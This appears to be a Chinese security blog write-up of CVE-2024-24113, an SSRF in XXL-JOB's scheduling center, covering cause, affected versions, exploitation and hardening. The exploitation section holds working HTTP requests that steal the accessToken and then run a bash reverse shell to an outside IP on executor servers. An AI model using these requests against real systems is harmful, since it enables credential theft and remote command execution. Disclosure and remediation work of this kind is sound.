#  漏洞研究(9)：XXL-JOB调度中心后台任务执行SSRF漏洞 CVE-2024-24113   
原创 罗锦海  OneMoreThink   2025-05-18 16:00  
  
1. 组件介绍  
  
1. 原理与危害  
  
1. 影响版本  
  
1. 利用方式  
  
1. 加固措施（单选）  
  
    5.1 修改默认口令  
  
    5.2 限制端口访问  
  
## 1. 组件介绍  
  
XXL-JOB是一个分布式**任务调度**  
平台，分为调度中心和执行器两部分。  
  
在调度中心添加执行器后，调度中心可以对执行器进行命令执行，属于集权系统，可以帮助攻击者批量获取服务器权限。  
  
同时，通过调度中心横向到执行器，往往可以帮助攻击者实现跨网横移，这在网络策略严格的环境中具有较大价值。  
## 2. 原理与危害  
  
调度中心后台用户向执行器下发任务时，请求中可以指定执行器的IP地址和端口号，让调度中心向该IP地址的执行器下发任务。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91iaJgEJ1ddiazHWOv429AQbgULTGRLzsDpCjrx1KzelSsuOvRBSO41MTueEKpzbtyshJ9YzEVicUXZw/640?from=appmsg "")  
  
由于调度中心没有对该IP地址进行校验，因此用户可以指定任意IP地址，导致调度中心后台存在SSRF漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91iaJgEJ1ddiazHWOv429AQbgYuKyZIBmRwTQTU3RS2sH5ahhic4ky8lJAicEibb0wyxAlIcLGJ7Mvc2ww/640?from=appmsg "")  
  
由于调度中心向执行器下发任务时，携带了通信密钥accessToken，因此恶意用户可以将执行器的IP地址指定为他可控的HTTP服务器，从而窃取XXL-JOB的通信密钥。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91iaJgEJ1ddiazHWOv429AQbgOrguHicgVhCChQCm6oXmlkD9xqw6ibqvKmyaLnVydJ2MImpIfXbEWkhw/640?from=appmsg "")  
  
这在恶意用户仅获取XXL-JOB调度中心的普通用户权限时会有价值。当普通权限的恶意用户**没有任何执行器的权限**  
，或者**只有部分执行器的权限**  
时，攻击者如果想要**获取所有执行器的权限**  
，  
  
可以利用SSRF漏洞窃取accessToken，进而伪装成调度中心，与所有执行器进行调度通信，对执行器所在的服务器进行任意命令执行，从而获得执行器所在服务器的权限。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91iaJgEJ1ddiazHWOv429AQbgrOjYSFiawo4IIdO23IFGY8lFKEsNqvmsAuJsDiabeVgg79vj3IAhOiaXg/640?from=appmsg "")  
  
参考链接： https://github.com/xuxueli/xxl-job/issues/3375  
## 3. 影响版本  
  
该漏洞已在2.5.0版本修复，受影响版本是XXL-JOB <= 2.4.2  
。  
## 4. 利用方式  
  
第一步：由于这是一个web管理后台的漏洞，因此首先需要通过弱口令、口令泄漏等方式，拿到XXL-JOB的帐号密码，并登录web管理后台，拿到Cookie。  
  
第二步：利用SSRF漏洞，窃取XXL-JOB的accessToken。  
```
POST /xxl-job-admin/jobinfo/trigger HTTP/1.1
Host: 10.58.81.107:11240
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d
Content-Length: 64

id=2&executorParam=&addressList=http%3A%2F%2F10.58.81.119%3A1234

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91iaJgEJ1ddiazHWOv429AQbgYuKyZIBmRwTQTU3RS2sH5ahhic4ky8lJAicEibb0wyxAlIcLGJ7Mvc2ww/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91iaJgEJ1ddiazHWOv429AQbgOrguHicgVhCChQCm6oXmlkD9xqw6ibqvKmyaLnVydJ2MImpIfXbEWkhw/640?from=appmsg "")  
  
第三步：利用accessToken，伪装成调度中心与执行器进行调度通信，对执行器所在的服务器执行任意命令，从而获得执行器所在服务器的权限。  
```
POST /run HTTP/1.1
Host: 10.58.81.107:9999
XXL-JOB-ACCESS-TOKEN: default_token
Content-Length: 359

{
	"jobId":1,
	"executorHandler":"demoJobHandler",
	"executorParams":"demoJobHandler",
	"executorBlockStrategy":"COVER_EARLY",
	"executorTimeout":0,
	"logId":1,
	"logDateTime":1747409048,
	"glueType":"GLUE_SHELL",
	"glueSource":"bash -i >& /dev/tcp/10.58.81.119/8888 0>&1",
	"glueUpdatetime":1747409048,
	"broadcastIndex":0,
	"broadcastTotal":0
}

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91iaJgEJ1ddiazHWOv429AQbg2Sm3c4pE6GAtQNeZoyLRA5e3WyFQtiaKRI3KMmgHyrMrf3v0ubiaicycQ/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91iaJgEJ1ddiazHWOv429AQbgWJ6QqxjLmiaIat5EJk1f92zqVgicj2c1zW65byhH0P9aqt5F0TFf2ibCw/640?from=appmsg "")  
## 5. 加固措施（单选）  
### 5.1 修改默认口令  
  
点击右上角的欢迎 admin  
，选择修改密码，修改后会退出登录。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91iaJgEJ1ddiazHWOv429AQbgSHzrJFTS0Mr7JYL4cdicUWgicKBLKSqYQuMFDia8Su8MUEt8uDAepgcwA/640?from=appmsg "")  
  
请注意：登录密码不应超过18位，因为前端登录时会对密码进行截取。XXL-JOB >= 2.1.1  
时前端无法改成超过18位的密码，但XXL-JOB < 2.1.1  
时可以，导致修改密码后无法登录。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91iaJgEJ1ddiazHWOv429AQbgbAvWcU6lVpkFndqVR6Hvic2tBIpRZibCywib6vrak6A8ic8iaSibMhvH4SAg/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91iaJgEJ1ddiazHWOv429AQbgb8U8xo12qm2fJ2CcCQUicajXtHN9021fQLATcriaa8U0V8Fx3RAMA2Bw/640?from=appmsg "")  
  
此时使用默认口令登录，提示帐号或密码错误，说明漏洞修复成功。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91iaJgEJ1ddiazHWOv429AQbg93dTmx3fAJkR6eiaQtncvrx205RfxXFfTfMEHvicHwMvkSSuZCoaEPhg/640?from=appmsg "")  
### 5.2 限制端口访问  
  
在**执行器所在的服务器**  
中配置本地防火墙，只允许调度中心访问执行器的9999端口。  
```
# 如果担心已有规则干扰，可将允许规则插入到链的顶部。
# 即时调度中心和执行器在同一台服务器中，该命令不会影响调度中心对执行器的正常通信。
iptables -I INPUT 1 -p tcp -s 10.58.81.107 --dport 9999 -j ACCEPT

# 拒绝其他所有IP访问9999端口
iptables -A INPUT -p tcp --dport 9999 -j DROP

# 永久保存规则（CentOS中）
yum install iptables-services -y && service iptables save && systemctl enable iptables

```  
  
再次对执行器进行未授权任意代码执行，如果没有响应，连接失败，说明漏洞修复成功。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV91iaJgEJ1ddiazHWOv429AQbgs48RcGy2zBa69hpQ83A4EvcuLRsPo4xoGku8HaOo6qiaP0hZibibuiaPdg/640?from=appmsg "")  
  
  
